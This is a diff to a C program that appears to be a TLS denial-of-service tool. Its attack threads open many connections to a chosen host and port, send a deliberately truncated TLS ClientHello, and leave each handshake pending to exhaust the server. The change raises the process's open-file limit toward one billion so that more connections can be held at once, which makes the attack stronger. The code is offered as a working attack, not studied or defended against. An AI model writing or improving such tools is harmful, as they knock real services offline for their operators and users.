@@ -9,7 +9,10 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <stdatomic.h>
-#include <stddef.h>  // For size_t
+#include <stddef.h>   // For size_t
+#include <sys/resource.h>  // For setrlimit
+
+#define DESIRED_NOFILE 1000000000
 
 #define BANNER "\n\033[1;31m" \
 "                            ,-.\n" \
@@ -56,10 +59,9 @@ void print_stats() {
 
 void* attack_thread(void* arg) {
     ThreadConfig *config = (ThreadConfig*)arg;
-    // Define a partial TLS ClientHello message.
-    // This is a truncated ClientHello; it does not complete the handshake.
+    // A partial ClientHello message (incomplete handshake)
     unsigned char partialClientHello[] = {
-        0x16, 0x03, 0x01, 0x00, 0xdc,  // TLS record header: Handshake, TLS 1.0, length 0xdc
+        0x16, 0x03, 0x01, 0x00, 0xdc,  // TLS record header: Handshake, TLS1.0, length 0xdc
         0x01,                         // Handshake type: ClientHello
         0x00, 0x00, 0xd8              // Incomplete handshake length field
     };
@@ -73,7 +75,7 @@ void* attack_thread(void* arg) {
             ssize_t sent = send(sock, partialClientHello, sizeof(partialClientHello), 0);
             if (sent == sizeof(partialClientHello)) {
                 atomic_fetch_add(&successful_handshakes, 1);
-                // Connection remains open with the handshake left pending.
+                // Leave the connection open with handshake pending.
             } else {
                 close(sock);
             }
@@ -96,6 +98,28 @@ int main(int argc, char *argv[]) {
     if (argc != 4) {
         printf("Usage: %s <IP/HOST> <PORT> <THREADS>\n", argv[0]);
         return EXIT_FAILURE;
+    }
+    
+    // Attempt to raise the open file descriptor limit.
+    struct rlimit rl;
+    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
+        unsigned long target = DESIRED_NOFILE;
+        // Ensure our desired value does not exceed the hard limit.
+        if (target > rl.rlim_max)
+            target = rl.rlim_max;
+        // Try setting the soft limit; if it fails, scale down.
+        while (target > rl.rlim_cur) {
+            rl.rlim_cur = target;
+            if (setrlimit(RLIMIT_NOFILE, &rl) == 0) {
+                printf("[*] Open file descriptor limit set to %lu\n", target);
+                break;
+            } else {
+                perror("setrlimit failed");
+                target /= 2;
+            }
+        }
+    } else {
+        perror("getrlimit failed");
     }
     
     g_target_host = argv[1];
